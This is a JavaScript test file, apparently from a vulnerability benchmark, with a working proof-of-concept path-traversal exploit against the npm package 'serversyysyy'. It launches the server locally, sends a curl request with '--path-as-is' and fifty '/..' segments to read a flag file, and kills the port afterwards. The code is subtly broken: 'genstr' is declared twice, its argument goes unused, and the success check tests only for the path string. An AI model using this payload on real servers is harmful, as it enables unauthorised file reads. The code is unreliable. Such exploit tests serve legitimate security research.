function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8888/tcp");
    } catch (e) {}
  });

  const path = require("path");
  const { sleep } = require("sleep");

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  function genstr(n) {
    return "/..".repeat(50) + pathToFlag;
  }

  test("Path Traversal in serversyysyy", (done) => {
    expect.assertions(1);

    let server = "node ./node_modules/serversyysyy/index.js";
    let exe = exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;

    exec(attack_string, (error, stdout) => {
      let out = false;
      if (stdout.includes(pathToFlag)) {
        out = true;
      }
      expect(out).toBe(true);

      exec("fuser -k 8888/tcp", (error, stdout) => {
        done();
      });
    });
  });
}

module.exports = { exploitFunction };